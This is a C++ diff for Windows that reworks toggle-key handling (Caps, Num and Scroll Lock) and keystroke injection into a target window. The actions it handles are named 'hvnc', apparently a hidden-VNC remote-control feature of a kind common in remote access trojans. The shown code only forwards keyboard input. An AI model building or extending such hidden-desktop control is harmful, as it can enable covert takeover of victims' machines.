@@ -949,24 +949,37 @@ static void input_loop() {
             DWORD currentThreadId = GetCurrentThreadId();
 
             if (action == "hvnc_keydown") {
-                if (vk == VK_CAPITAL) {
-                    g_keyState[vk] ^= 1;
+                bool isToggle = (vk == VK_CAPITAL || vk == VK_NUMLOCK || vk == VK_SCROLL);
+
+                if (isToggle) {
+                    // Only toggle if the key was not already "down" (prevent auto-repeat toggling)
+                    if (!(g_keyState[vk] & 0x80)) {
+                        g_keyState[vk] ^= 0x01; // Toggle bit 0
+                        g_keyState[vk] |= 0x80; // Mark as down
+
+                        // keybd_event updates the global keyboard state for the desktop
+                        keybd_event((BYTE)vk, 0, 0, 0);
+                        keybd_event((BYTE)vk, 0, KEYEVENTF_KEYUP, 0);
+                    }
                 } else {
                     g_keyState[vk] |= 0x80;
                 }
 
                 AttachThreadInput(currentThreadId, targetThreadId, TRUE);
                 SetKeyboardState(g_keyState);
-                PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
-                AttachThreadInput(currentThreadId, targetThreadId, FALSE);
-            } else if (action == "hvnc_keyup") {
-                if (vk != VK_CAPITAL) {
-                    g_keyState[vk] &= ~0x80;
+                if (!isToggle) {
+                    PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
                 }
+                AttachThreadInput(currentThreadId, targetThreadId, FALSE);
+
+            } else if (action == "hvnc_keyup") {
+                g_keyState[vk] &= ~0x80;
 
                 AttachThreadInput(currentThreadId, targetThreadId, TRUE);
                 SetKeyboardState(g_keyState);
-                PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
+                if (vk != VK_CAPITAL && vk != VK_NUMLOCK && vk != VK_SCROLL) {
+                    PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
+                }
                 AttachThreadInput(currentThreadId, targetThreadId, FALSE);
             }
             g_forceFullFrame = true;
